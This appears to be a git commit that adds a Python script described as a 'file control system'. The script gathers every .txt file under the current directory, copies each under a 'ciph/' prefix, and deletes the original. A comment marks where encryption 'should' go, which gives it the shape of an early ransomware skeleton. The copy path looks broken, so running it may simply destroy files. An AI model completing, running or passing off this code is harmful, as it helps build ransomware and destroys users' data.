3794ee79f30a1f076db2193a7f23bc9b0f4d60e5
Onlymachiavelli <alaa.barka@tendanz.com>
2026-02-10 14:04:58 +0100

    feat: :sparkles: initializing the repo with based file control system codes

---
+++ mian.py
@@ -0,0 +1,46 @@
+import os 
+
+def getCurrentDir():
+    return os.getcwd()
+
+def getListOfFiles(dirName):
+    listOfFile = os.listdir(dirName)
+    allFiles = list()
+    for entry in listOfFile:
+        fullPath = os.path.join(dirName, entry)
+        if os.path.isdir(fullPath):
+            allFiles = allFiles + getListOfFiles(fullPath)
+        else:
+            allFiles.append(fullPath)
+
+    textOnly = [f for f in allFiles if f.endswith('.txt')]
+    return textOnly
+
+def readFile(filePath):
+    with open(filePath, 'r') as file:
+        data = file.read()
+    return data
+
+def deleteFile(filePath):
+    os.remove(filePath)
+
+def createFileAndWrite(filePath, data):
+    with open("ciph/"+filePath, 'w') as file:
+        file.write(data)
+
+if __name__ == "__main__":
+    
+    currentDir = getCurrentDir()
+    listOfFiles = getListOfFiles(currentDir)
+    for file in listOfFiles:
+
+
+        #read the files 
+        data = readFile(file)
+
+        #should crypt the files 
+        createFileAndWrite(file, data)
+
+
+        #delete the old files 
+        deleteFile(file)
